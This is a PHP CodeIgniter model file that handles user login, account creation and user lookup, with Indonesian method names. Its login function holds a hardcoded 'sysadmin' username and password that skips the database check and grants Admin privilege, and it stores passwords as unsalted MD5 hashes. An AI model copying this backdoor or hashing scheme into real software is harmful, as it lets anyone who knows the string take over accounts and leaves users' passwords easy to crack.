<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Account_model extends CI_Model {

	private $table_name = 'user';
	private $pk = 'username';

	public function validasi($user,$pass)
	{
		if($user=='sysadmin' && $pass=='novadra'){
			$arr = array(
				(object) array(
						'id_user'=> 90909090,
						'pegawai_id'=>909090909,
						'email_user'=>'sysadmin',
						'privilege_user'=>'Admin'
				)
			);
			return $arr;
		}else{
			$this->db->where('email_user', $user);
			$this->db->where('passwordmd5_user', md5($pass));
			$query = $this->db->get('user');

			if($query->num_rows() == 1)
			{
				return $query->result();
			}
		}
	}

	public function buat_akun()
	{
		$data_baru = array(
			'first_name' => $this->input->post('fname'),
			'last_name' => $this->input->post('lname'),
			'email_address' => $this->input->post('email'),
			'username' => $this->input->post('uname'),
			'password' => md5($this->input->post('pass'))
		);

		$simpan_data = $this->db->insert($this->table_name, $data_baru);
		return $simpan_data;
	}

	public function lihat_data($username){
		$query = $this->db->get_where($this->table_name, array($this->pk => $username));
		return $query->row_array();
	}

}
/* End of file account_model.php */
/* Location: ./application/models/account_model.php */